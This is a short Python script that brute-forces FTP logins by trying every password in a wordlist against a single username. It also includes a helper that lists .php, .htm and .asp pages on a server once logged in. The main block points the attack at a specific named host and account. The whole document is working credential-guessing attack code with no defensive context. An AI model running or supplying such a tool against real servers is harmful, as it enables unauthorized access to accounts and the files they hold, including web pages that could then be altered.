import ftplib

# Searches for and returns any .php, .htm, or .asp pages
def returnDefault(ftp):
    try:
        dirList = ftp.nlst()
    except:
        dirList = []
        print ('[-] Could not list directory contents.')
        print ('[-] Skipping to Next Target.')
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print '[+] Found default page: ' + fileName
            retList.append(fileName)
    return retList


# Brute Forces a FTP Server given a IP and dictionary
def bruteLogin(hostname, user, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = user
        passWord = line.strip('\r').strip('\n')
        print("[+] Trying : " + userName + "/" + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print ('\n[*]'
                + str(hostname)
                + ' FTP Logon Succeeded: '
                + userName
                + '/'
                + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)
            

if __name__ == "__main__":
    host       = 'ftp.cameroncooper.co'
    user       = 'cameroncooperco'
    passwdFile = '../sshbruteforce/wordlist.txt'
    bruteLogin(host, user, passwdFile)
    
    # userName = 'guest'
    # passWord = 'guest'
    # ftp = ftplib.FTP(host)
    # ftp.login()
    # returnDefault(ftp)